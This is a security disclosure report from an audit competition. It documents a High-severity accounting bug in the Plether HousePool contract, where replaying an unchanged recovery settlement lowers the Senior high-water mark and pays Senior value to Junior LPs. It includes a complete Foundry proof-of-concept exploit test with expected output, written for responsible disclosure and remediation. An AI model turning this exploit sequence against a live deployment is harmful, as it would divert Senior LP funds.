# \#98174 [SC-High] Replaying unchanged recovery buckets erases Senior restoration priority and pays Junior

**Submitted on Nov 5th 2026 at 18:06:27 UTC by @go4ko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98174
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Plether's recovery waterfall is not idempotent. Once a partial post-deficit recapitalization has been recorded for Senior, another LP settlement can process the same physical cash as though it were still unassigned. The replay fabricates a loss, reduces the Senior high-water mark to the leftover recapitalization bucket, and makes the displaced Senior value withdrawable by Junior.

The PoC uses only `1.00` and `1.0196` basket prices. The legitimate recovery settlement records `132,338.461732` USDG as Senior principal and a `200,000` USDG restoration target. With no intervening cash, claim, position, or price change, a later permissionless settlement reduces Senior principal and its mark to `67,661.538268` USDG, pays `47,761.538897` USDG to Junior, and leaves `16,915.384567` USDG as additional Junior principal. A Senior redemption from the identical saved state receives only `67,661.531429` USDG.

## Vulnerability Details

### The same recovery cash is consumed twice

At the tested recovery snapshot, both tranche principals are zero but their share supplies survive. Claim settlement has left the HousePool with `132,338.461732` USDG, while the accounting queues contain `200,000` USDG of recapitalization and `128,338.461732` USDG of trading revenue.

`HousePoolReconcilePlanLib.planReconcile` removes the settleable claimant buckets from `snapshot.distributable` before applying the ordinary loss waterfall:

```solidity
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
```

The first settlement correctly uses all available cash to seed Senior after the wipe. Stored Senior principal becomes `132,338.461732` USDG, its high-water mark becomes the explicit `200,000` USDG recapitalization target, and the unbacked `67,661.538268` USDG remainder stays pending. That one-time reset is intentional and is pinned by the repository's recovery tests.

The defect appears when the unchanged state is reconciled again. The residual recapitalization plus queued revenue exceeds the same `132,338.461732` USDG of cash, so the planner reserves all distributable value a second time. The loss waterfall then compares zero distributable value with the already-recorded Senior principal and transiently reduces Senior to zero even though no loss occurred.

`applyClaimantRecapitalizationIntent` mistakes that transient zero for a genuinely empty post-wipe pool and re-enters its bootstrap branch:

```solidity
if (state.seniorSupply > 0) {
    if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
        state.waterfall.seniorPrincipal += remaining;
        state.waterfall.seniorHighWaterMark =
            recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
        remaining = 0;
    }
}
```

This time `recapitalizationTargetAssets` contains only the `67,661.538268` USDG residual, so the existing `200,000` USDG high-water mark is overwritten with that smaller value. Meanwhile, `_reconcile` computed `allowRevenueContinuation` from the stored pre-plan state in which Senior was nonzero. Revenue therefore continues after the false bootstrap, sees no remaining Senior restoration gap, and allocates `64,676.923464` USDG to Junior.

| Observation | HousePool cash | Senior principal | Senior mark | Junior principal | Funded Junior exit | Pending recap | Pending revenue |
| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: |
| Recovery input | 132,338.461732 | 0 | 9,900,091.411643 | 0 | 0 | 200,000.000000 | 128,338.461732 |
| Recovery recorded | 132,338.461732 | 132,338.461732 | 200,000.000000 | 0 | 0 | 67,661.538268 | 128,338.461732 |
| Unchanged-state replay | 84,576.922835 | 67,661.538268 | 67,661.538268 | 16,915.384567 | 47,761.538897 | 0 | 63,661.538268 |

The lower final cash is caused by funding the Junior redemption during the faulty settlement. It is not an intervening economic loss.

The PoC forks the `Recovery recorded` state with `vm.snapshotState()`:

1. In the Junior branch, the replay funds and transfers `47,761.538897` USDG to the Junior LP and retains another `16,915.384567` USDG as Junior principal.
2. In the Senior branch, the Senior LP's own redemption necessarily invokes the same replay and pays `67,661.531429` USDG. Compared with the recorded `132,338.461732` USDG Senior value, the executable shortfall is `64,676.930303` USDG.

This contradicts the documented rules that Senior impairment must be restored before Junior extracts surplus (`SECURITY.md` L394) and that losses do not reduce the Senior high-water mark (`ACCOUNTING_SPEC.md` L337).

### Reachability and exact preconditions

The PoC does not rely on the earlier `0.01`/`2.00` endpoint construction. It opens a 10M Short and 6M Long under the release 40% skew limit and uses only `1.00` and `1.0196`, the move used by the whitepaper's Friday-to-Monday risk example.

The terminal deficit is introduced by burning the mock USDG balance. This is a permitted dependency mock: the contest rules state, “Only out-of-scope dependencies such as Pyth updates and USDG may be mocked.” Plether's own `TrancheRecoveryBehavior.t.sol` constructs its full-wipe recovery test by burning the pool's mock settlement-token balance, and `SECURITY.md` lists USDG blacklist, upgrade, and collateral-centralization risks with no core-protocol mitigation. The burn constructs a supported recovery precondition; it is not attributed to the Junior LP and is not the claimed vulnerability.

After that precondition, the tested sequence uses protocol entry points: the Long is liquidated before the Short closes, the liquidation queues revenue, the Short closes into a claim, governance follows the documented runbook by recapitalizing `200,000` USDG and clearing degraded mode after claim settlement, and ordinary LP epochs execute the accounting defect. No malicious administrator, corrupted oracle, non-release risk limit, or private keeper is assumed.

This is also distinct from the intended initial reset. Changing the stale post-wipe mark to the explicit `200,000` USDG recovery target is correct. The vulnerability is the later reduction from `200,000` to `67,661.538268` with unchanged economic inputs.

The demonstrated trigger band is `n < R <= Y + 2n`, where `n` is the net winner cash paid after the wipe and `Y` is queued revenue. In this fixture it is approximately `67,662` through `263,661` USDG. The test exercises five values inside the band and a `270,000` USDG value outside it.

### Relation to prior findings

- **SC-L1 (SC Audit Studio), fixed:** its partial-settlement behavior leaves unbacked claimant buckets pending. This report demonstrates that a later reconcile reserves the remainder against cash already credited to Senior.
- **MED-12 (Cecuro), addressed:** it concerns allowing revenue to continue after recapitalization. Here that behavior combines with a new phantom bootstrap to overwrite an already-established recovery mark and divert Senior value.
- **MED-11 (Cecuro):** it scales the mark during a real Senior withdrawal. Here the mark falls before any successful Senior withdrawal and without an economic loss.

## Impact Details

The affected amount is Senior LP principal, not unclaimed yield:

- `47,761.538897` USDG is transferred to the Junior LP through `claimRedeem`;
- `16,915.384567` USDG remains recorded as Junior principal;
- the Senior LP's executable payout is reduced by `64,676.930303` USDG, approximately 48.87% of its previously recorded value; and
- the Senior restoration mark falls from `200,000` to `67,661.538268` USDG without a new loss.

Once the recovery state exists, an existing Junior LP needs no role: it submits an ordinary redemption and calls permissionless LP settlement. Value assigned to one user class becomes withdrawable by another, matching the in-scope direct-theft impact.

Demonstrated limitations are stated rather than hidden. This construction requires the Long liquidation before the Short close. If a Senior redemption is already mature during the initial recovery settlement, the epoch reverts with `HousePool__NoLpEpochProgress`; a request that matures afterward triggers the defective replay and receives the reduced payout.

## Recommendation

1. Distinguish a real empty-pool bootstrap from principal that `planReconcile` only transiently reduced to zero. Preserve the designed initial post-wipe reset, but never let a replay of the same recovery lower the mark it established.
2. Track pending-bucket backing so residual buckets cannot reserve physical cash already credited to principal. Reconciliation with unchanged cash, claims, positions, price, and inflows should be idempotent.
3. Add a regression test comparing stored tranche state before and after an unchanged recovery replay.

## References

- [`HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L137)
- [`HousePoolPendingPreviewLib.applyRevenueIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L158-L189)
- [`HousePoolReconcilePlanLib.planReconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L47-L106)
- [`HousePool._reconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1598)
- [`CfdEngine.recapitalizePool`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L632) and [`clearDegradedMode`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L658-L667)
- [`SECURITY.md` Senior-first invariant](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L386-L395), [USDG dependency assumptions](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L442-L451), and [terminal-deficit runbook](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1499-L1511)
- [`ACCOUNTING_SPEC.md` waterfall rules](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L340)
- [`TrancheRecoveryBehavior.t.sol` designed reset](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/TrancheRecoveryBehavior.t.sol#L24-L55) and [recovery-state burn](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/TrancheRecoveryBehavior.t.sol#L622-L623)
- [`WHITEPAPER.md` Friday-to-Monday move data](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1411-L1428)
- [Plether competition PoC rules](https://immunefi.com/audit-competition/plether/scope/)
- [SC Audit Studio pre-audit, SC-L1](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf)

## Proof of Concept

## Proof of Concept

Every trade uses production V3 `OrderRouter.commitOrder` and `executeOrder`. Liquidation and LP settlement are permissionless; deposits and redemptions use public vault entry points. The owner only installs the release 40M/80% Senior limits through the real timelock and invokes the documented recovery actions.

The only mocked dependencies are Pyth and USDG, exactly as the contest permits. The inherited fixture has a 100 USDG minimum open notional instead of 1,000, but all tested orders are millions of USDG. Its adverse-confidence multiplier is 2,000 rather than 2,500 bps, while all mock prices use zero confidence. Neither fixture difference changes execution or accounting in this path.

Execution sequence:

1. Activate 2.5M Junior and 9.9M Senior deposits, then open a 10M Short and 6M Long at `1.00` while remaining inside the 40% skew limit.
2. Remove the mock pool USDG balance and settle an LP epoch at `1.0196`, creating the terminal-deficit recovery condition used by the repository's tests.
3. Liquidate the Long at the unchanged mark to queue revenue, then close the Short into a claim.
4. Recapitalize `200,000` USDG, settle the claim, and clear degraded mode.
5. Record the initial recovery settlement. Save that exact state and independently execute a Junior exit and a Senior exit, each of which invokes the defective replay.
6. Complete both branches with real `claimRedeem` transfers.

The additional tests cover the partial-backing band and the already-mature Senior-exit limitation.

Save the following file as `packages/perps/test/perps/regression/RepeatedRecoveryReservation.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {console2} from "forge-std/console2.sol";

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// Cheatcodes and test helpers used:
/// - MockSettlementToken.mint funds EOAs and the legitimate owner recapitalization; USDG is explicitly mockable.
/// - vm.prank/startPrank act only as ordinary LPs, traders, or a permissionless keeper, never as an in-scope contract.
/// - vm.warp advances only the real 72-hour config delay, one-hour LP epochs, and one-hour redemption cooldowns.
/// - BasePerpTest._mockPythUpdateData advances one block/second and supplies a signed-price mock through the public Router.
/// - BasePerpTest._fundTrader uses the public clearinghouse deposit path.
/// - No vm.store, in-scope-contract impersonation, legacy Router entrypoint, or forged in-scope balance is used.
contract RecoveryReservationHarness is BasePerpTest {

    address internal constant JUNIOR_HOLDER = address(0xA1101);
    address internal constant SENIOR_HOLDER = address(0xA1102);
    address internal constant LOSING_LONG = address(0xA1103);
    address internal constant WINNING_SHORT = address(0xA1104);
    address internal constant SETTLER = address(0xA1106);

    uint256 internal constant JUNIOR_DEPOSIT = 2_500_000e6;
    uint256 internal constant SENIOR_DEPOSIT = 9_900_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _activateDeposit(
        TrancheVault vault,
        address lp,
        uint256 assets,
        uint256 markPrice
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();

        uint256 activationTime = vault.depositEpochStart(requestId);
        if (block.timestamp < activationTime) {
            vm.warp(activationTime); // Ordinary asynchronous LP epoch delay.
        }
        _settleEpoch(markPrice);

        uint256 claimableAssets = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, assets);
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, claimableAssets, lp, lp);
    }

    function _executeOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 executionPrice
    ) internal returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()) + 0x1000);
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = executionPrice;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });

        vm.prank(account);
        orderId = router.commitOrder(request);
        bytes[] memory updateData = _mockPythUpdateData(executionPrice);
        vm.prank(SETTLER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(result.orderId, orderId);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _settleEpoch(
        uint256 price
    ) internal {
        bytes[] memory updateData = _mockPythUpdateData(price);
        vm.prank(SETTLER);
        router.settleLpEpoch(updateData);
    }

    function _queueAllJuniorShares() internal returns (uint256 requestId, uint256 shares) {
        _completeJuniorCooldown();
        shares = juniorVault.balanceOf(JUNIOR_HOLDER);
        assertGt(shares, 0);
        vm.prank(JUNIOR_HOLDER);
        requestId = juniorVault.requestRedeem(shares, JUNIOR_HOLDER, JUNIOR_HOLDER);
    }

    function _claimJuniorRefund(
        uint256 requestId
    ) internal returns (uint256 shares) {
        shares = juniorVault.refundableRedeemRequest(requestId, JUNIOR_HOLDER);
        assertGt(shares, 0, "zero-quote epoch must return the attacker's shares");
        vm.prank(JUNIOR_HOLDER);
        uint256 returnedShares = juniorVault.claimRedeemRefund(requestId, JUNIOR_HOLDER, JUNIOR_HOLDER);
        assertEq(returnedShares, shares);
    }

    function _completeJuniorCooldown() internal {
        uint256 ready = juniorVault.lastDepositTime(JUNIOR_HOLDER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < ready) {
            vm.warp(ready); // Ordinary one-hour cooldown after deposit activation or share refund.
        }
    }

    function _advanceToEpoch(
        uint256 requestId
    ) internal {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp < maturity) {
            vm.warp(maturity); // Ordinary one-hour epoch maturation, including the five-minute request cutoff rule.
        }
    }

}

/// @notice Demonstrates that replaying an unchanged partial recovery settlement diverts Senior value.
/// @dev Prices remain at 1.00 and 1.0196. A mocked settlement-token loss creates
///      the documented terminal-deficit state; every later recovery, liquidation, reconciliation,
///      and redemption action uses production entry points and release risk settings.
contract RepeatedRecoveryReservationTest is RecoveryReservationHarness {

    uint256 internal constant BASE_MARK = 1e8;
    uint256 internal constant WEEKEND_MOVE_MARK = 101_960_000;

    uint256 internal constant SHORT_NOTIONAL = 10_000_000e18;
    uint256 internal constant RECOVERY_INFLOW = 200_000e6;

    function test_RepeatedReconcilePaysJuniorFromSeniorRecovery() public {
        _buildRecoveredPoolSnapshot();
        _measureRepeatedReconcile(WEEKEND_MOVE_MARK);
    }

    /// @dev Here n is net winner cash paid after the wipe and Y is queued revenue. The reset
    ///      occurs for n < R <= Y + 2n and disappears once recapitalization covers both buckets.
    function test_ResetOnlyOccursInsidePartialBackingBand() public {
        uint256[5] memory insideWindow = [uint256(75_000e6), 110_000e6, 200_000e6, 240_000e6, 260_000e6];

        for (uint256 i; i < insideWindow.length; ++i) {
            uint256 snapshot = vm.snapshotState();
            _buildRecoveredPoolSnapshot(insideWindow[i]);
            _runInitialRecoveryPass(WEEKEND_MOVE_MARK);
            uint256 hwmAfterOne = pool.seniorHighWaterMark();
            _runFollowupPass(WEEKEND_MOVE_MARK);
            assertLt(pool.seniorHighWaterMark(), hwmAfterOne, "inside window second settlement lowers H");
            vm.revertToState(snapshot);
        }

        _buildRecoveredPoolSnapshot(270_000e6);
        _runInitialRecoveryPass(WEEKEND_MOVE_MARK);
        uint256 hwmOutside = pool.seniorHighWaterMark();
        uint256 seniorOutside = pool.seniorPrincipal();
        _runFollowupPass(WEEKEND_MOVE_MARK);
        assertEq(pool.seniorHighWaterMark(), hwmOutside, "above window H is unchanged");
        assertEq(pool.seniorPrincipal(), seniorOutside, "above window Senior is unchanged");
    }

    /// @dev If a Senior request is already mature at the first pass, settlement has no free cash
    ///      to fund it and no other progress, so it reverts and the stored state is unchanged.
    function test_MatureSeniorExitStopsInitialRecoveryPass() public {
        _buildRecoveredPoolSnapshot();
        uint256 seniorId = _queueAllSeniorShares();
        (uint256 juniorId,) = _queueAllJuniorShares();
        _advanceToEpoch(seniorId > juniorId ? seniorId : juniorId);
        bytes[] memory updateData = _mockPythUpdateData(WEEKEND_MOVE_MARK);
        vm.prank(SETTLER);
        vm.expectRevert(IHousePool.HousePool__NoLpEpochProgress.selector);
        router.settleLpEpoch(updateData);
    }

    /// @dev Branch A records the first-pass state. Branch B executes the second settlement.
    ///      Branch C proves a Senior LP cannot redeem the first-pass value: its redemption itself
    ///      invokes the second reconcile and receives the reduced amount.
    function _measureRepeatedReconcile(
        uint256 price
    ) internal {
        uint256 cash = pool.totalAssets();
        uint256 recap = pool.pendingRecapitalizationAssets();
        uint256 revenue = pool.pendingTradingRevenueAssets();
        assertEq(pool.seniorPrincipal() + pool.juniorPrincipal(), 0, "post-wipeout state");
        assertGt(recap, cash, "partially backed recapitalization");
        assertGt(revenue, 0, "queued later revenue");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claim remains");
        _logAccounting("snapshot");

        // Branch A: one settlement records all current cash as Senior principal.
        _runInitialRecoveryPass(price);
        uint256 seniorAfterOne = pool.seniorPrincipal();
        uint256 hwmAfterOne = pool.seniorHighWaterMark();
        assertEq(seniorAfterOne, cash, "one settlement assigns all cash to Senior");
        assertEq(pool.juniorPrincipal(), 0, "one settlement assigns nothing to Junior");
        assertEq(hwmAfterOne, recap, "one settlement records full recapitalization target");
        assertEq(pool.totalAssets(), cash, "cash unchanged");
        _logAccounting("A: after one settlement");
        uint256 afterOne = vm.snapshotState();

        // Branch B: a second settlement with no cash, claim, position, or price change.
        (uint256 juniorId,) = _queueAllJuniorShares();
        _advanceToEpoch(juniorId);
        _settleEpoch(price);
        uint256 seniorAfterTwo = pool.seniorPrincipal();
        uint256 juniorAssetsAfterTwo = juniorVault.claimableRedeemAssets(juniorId, JUNIOR_HOLDER);
        assertLt(seniorAfterTwo, seniorAfterOne, "second settlement lowers Senior principal");
        assertLt(pool.seniorHighWaterMark(), hwmAfterOne, "second settlement lowers HWM");
        assertGt(juniorAssetsAfterTwo, 0, "second settlement funds Junior");
        _logAccounting("B: after two settlements");
        console2.log(" Junior LP claimable    ", juniorAssetsAfterTwo);

        uint256 juniorShares = juniorVault.claimableRedeemRequest(juniorId, JUNIOR_HOLDER);
        vm.prank(JUNIOR_HOLDER);
        uint256 juniorPaid = juniorVault.claimRedeem(juniorId, juniorShares, JUNIOR_HOLDER, JUNIOR_HOLDER);
        assertEq(juniorPaid, juniorAssetsAfterTwo, "funded Junior redemption transfers the credited value");
        console2.log(" Junior LP paid         ", juniorPaid);

        // Branch C: from the identical one-settlement state, Senior redeems all shares.
        vm.revertToState(afterOne);
        uint256 seniorId = _queueAllSeniorShares();
        _advanceToEpoch(seniorId);
        _settleEpoch(price);
        uint256 seniorPayout = seniorVault.claimableRedeemAssets(seniorId, SENIOR_HOLDER);
        assertLt(seniorPayout, seniorAfterOne, "Senior cannot redeem first-settlement value");
        _logAccounting("C: Senior redeems after one settlement");
        console2.log(" Senior LP claimable    ", seniorPayout);

        uint256 seniorShares = seniorVault.claimableRedeemRequest(seniorId, SENIOR_HOLDER);
        vm.prank(SENIOR_HOLDER);
        uint256 paid = seniorVault.claimRedeem(seniorId, seniorShares, SENIOR_HOLDER, SENIOR_HOLDER);
        assertEq(paid, seniorPayout);

        console2.log("== difference");
        console2.log(" Senior value, one settlement ", seniorAfterOne);
        console2.log(" Senior LP paid               ", paid);
        console2.log(" Senior LP shortfall          ", seniorAfterOne - paid);
    }

    function _buildRecoveredPoolSnapshot() internal {
        _buildRecoveredPoolSnapshot(RECOVERY_INFLOW);
    }

    function _buildRecoveredPoolSnapshot(
        uint256 recapAssets
    ) internal {
        _setSeniorCapacity(40_000_000e6, 8000);
        _activateDeposit(juniorVault, JUNIOR_HOLDER, JUNIOR_DEPOSIT, BASE_MARK);
        _activateDeposit(seniorVault, SENIOR_HOLDER, SENIOR_DEPOSIT, BASE_MARK);
        _fundTrader(WINNING_SHORT, 700_000e6);
        _fundTrader(LOSING_LONG, 125_000e6);

        // Two-sided production V3 book. Every intermediate skew remains inside the release 40% limit.
        _executeOrder(WINNING_SHORT, CfdTypes.Side.SHORT, 4_000_000e18, 500_000e6, false, BASE_MARK);
        _executeOrder(LOSING_LONG, CfdTypes.Side.LONG, 4_000_000e18, 90_000e6, false, BASE_MARK);
        _executeOrder(WINNING_SHORT, CfdTypes.Side.SHORT, 4_000_000e18, 30_000e6, false, BASE_MARK);
        _executeOrder(LOSING_LONG, CfdTypes.Side.LONG, 2_000_000e18, 30_000e6, false, BASE_MARK);
        _executeOrder(WINNING_SHORT, CfdTypes.Side.SHORT, 2_000_000e18, 30_000e6, false, BASE_MARK);

        // The mock burn represents a token-level USDG loss. HousePool.totalAssets() follows it
        // through min(rawAssets, accountedAssets). The repository's recovery tests use the same setup.
        uint256 cashBeforeIncident = pool.rawAssets();
        settlementToken.burn(address(pool), cashBeforeIncident);
        console2.log("pool USDG removed       ", cashBeforeIncident);

        // The next permissionless LP epoch at a correct +1.96% mark persists the full wipe.
        (uint256 wipeId,) = _queueAllJuniorShares();
        _advanceToEpoch(wipeId);
        _settleEpoch(WEEKEND_MOVE_MARK);
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertGt(pool.seniorHighWaterMark(), 0);
        assertGt(pool.terminalDeficitAssets(), 0, "open winners exceed collectible losers");
        console2.log("terminal deficit        ", pool.terminalDeficitAssets());
        _claimJuniorRefund(wipeId);

        // A permissionless keeper liquidates the losing Long at the same mark; proceeds queue as revenue.
        bytes[] memory liquidationData = _mockPythUpdateData(WEEKEND_MOVE_MARK);
        vm.prank(SETTLER);
        router.executeLiquidation(LOSING_LONG, liquidationData);
        (uint256 longSize,,,,,,) = engine.positions(LOSING_LONG);
        assertEq(longSize, 0, "Long liquidated");
        assertGt(pool.pendingTradingRevenueAssets(), 0, "liquidation proceeds queued");
        console2.log("queued revenue Y        ", pool.pendingTradingRevenueAssets());

        // The winning Short closes at the same mark. Cash pays part; the rest becomes a claim.
        _executeOrder(WINNING_SHORT, CfdTypes.Side.SHORT, SHORT_NOTIONAL, 0, true, WEEKEND_MOVE_MARK);
        uint256 claim = engine.traderClaimBalanceAssets(WINNING_SHORT);
        assertGt(claim, 0, "winner has claim empty pool cannot fully pay");
        assertTrue(engine.degradedMode());
        console2.log("winner claim            ", claim);

        // Documented terminal-deficit recovery: recapitalize, settle the claim, clear degraded mode.
        _injectRecoveryCapital(recapAssets);
        vm.prank(WINNING_SHORT);
        engine.settleTraderClaim(WINNING_SHORT);
        engine.clearDegradedMode();
    }

    function _injectRecoveryCapital(
        uint256 amount
    ) internal {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(engine), amount);
        engine.recapitalizePool(amount);
    }

    function _runInitialRecoveryPass(
        uint256 price
    ) internal {
        (uint256 requestId,) = _queueAllJuniorShares();
        _advanceToEpoch(requestId);
        _settleEpoch(price);
        _claimJuniorRefund(requestId);
    }

    function _runFollowupPass(
        uint256 price
    ) internal {
        (uint256 requestId,) = _queueAllJuniorShares();
        _advanceToEpoch(requestId);
        _settleEpoch(price);
        uint256 refundable = juniorVault.refundableRedeemRequest(requestId, JUNIOR_HOLDER);
        if (refundable > 0) {
            vm.prank(JUNIOR_HOLDER);
            juniorVault.claimRedeemRefund(requestId, JUNIOR_HOLDER, JUNIOR_HOLDER);
        }
    }

    function _queueAllSeniorShares() internal returns (uint256 requestId) {
        uint256 ready = seniorVault.lastDepositTime(SENIOR_HOLDER) + seniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < ready) {
            vm.warp(ready);
        }
        uint256 shares = seniorVault.balanceOf(SENIOR_HOLDER);
        vm.prank(SENIOR_HOLDER);
        requestId = seniorVault.requestRedeem(shares, SENIOR_HOLDER, SENIOR_HOLDER);
    }

    function _logAccounting(
        string memory tag
    ) internal view {
        console2.log("==", tag);
        console2.log(" cash                   ", pool.totalAssets());
        console2.log(" Senior principal       ", pool.seniorPrincipal());
        console2.log(" Junior principal       ", pool.juniorPrincipal());
        console2.log(" Senior high-water mark ", pool.seniorHighWaterMark());
        console2.log(" pending recapitalization", pool.pendingRecapitalizationAssets());
        console2.log(" pending revenue        ", pool.pendingTradingRevenueAssets());
    }

}
```

Run:

```sh
forge test --root packages/perps \
  --match-path test/perps/regression/RepeatedRecoveryReservation.t.sol -vv
```

Expected relevant output:

```text
Ran 3 tests for test/perps/regression/RepeatedRecoveryReservation.t.sol:RepeatedRecoveryReservationTest
[PASS] test_MatureSeniorExitStopsInitialRecoveryPass()
[PASS] test_RepeatedReconcilePaysJuniorFromSeniorRecovery()
Logs:
  pool USDG removed        12406458872444
  terminal deficit         82000003915
  queued revenue Y         128284444334
  winner claim             196000000000
  == snapshot
   cash                    132338461732
   pending recapitalization 200000000000
   pending revenue         128338461732
  == A: after one settlement
   Senior principal        132338461732
   Junior principal        0
   Senior high-water mark  200000000000
  == B: after two settlements
   Senior principal        67661538268
   Junior principal        16915384567
   Senior high-water mark  67661538268
   Junior LP paid          47761538897
  == difference
   Senior value, one settlement  132338461732
   Senior LP paid                67661531429
   Senior LP shortfall           64676930303
[PASS] test_ResetOnlyOccursInsidePartialBackingBand()
Suite result: ok. 3 passed; 0 failed; 0 skipped
```

Values are USDG atoms with 6 decimals. The initial recovery settlement records `132,338.461732` USDG for Senior and a `200,000` USDG mark. Replaying the unchanged state pays the Senior LP only `67,661.531429` USDG and actually transfers `47,761.538897` USDG to Junior. No cash, claim, position, or price changes between the two reconciliations.
